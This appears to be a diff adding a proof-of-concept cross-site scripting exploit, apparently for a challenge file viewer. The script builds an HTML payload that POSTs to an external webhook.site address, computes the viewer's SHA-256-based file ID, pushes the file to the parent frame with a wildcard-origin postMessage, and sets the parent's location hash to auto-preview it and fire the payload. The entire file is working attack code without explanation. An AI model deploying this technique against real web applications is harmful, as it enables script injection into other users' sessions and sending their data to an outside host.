@@ -1,0 +1,30 @@
+<script>
+var html = `<script>
+fetch('https://webhook.site/3aedb54d-5270-4f0f-9bf5-8a336b4e16d9',{method:'POST',body:'xss'});
+<\/script>`;
+
+(async () => {
+  // Create the Blob and File
+  var blob = new Blob([html], {type:"text/html"});
+  var file = new File([blob], "poc.html", {type:"text/html"});
+
+  // Compute the ID as the challenge viewer does
+  var arrayBuffer = await file.arrayBuffer();
+  var hashBuffer = await crypto.subtle.digest('SHA-256', arrayBuffer);
+  function arrayToBase36(arr) {
+    return Array.from(new Uint8Array(arr)).reduce((a, b) => BigInt(256) * a + BigInt(b), BigInt(0)).toString(36);
+  }
+  var id = arrayToBase36(hashBuffer).slice(0, 50);
+
+  // Upload file to parent
+  parent.postMessage({
+    type: "share",
+    files: [{blob: blob, cached: false, name: "poc.html"}]
+  }, "*");
+
+  // Auto-preview: set hash to preview the new file
+  setTimeout(() => {
+    parent.location.hash = "#file-" + id;
+  }, 600);
+})();
+</script>
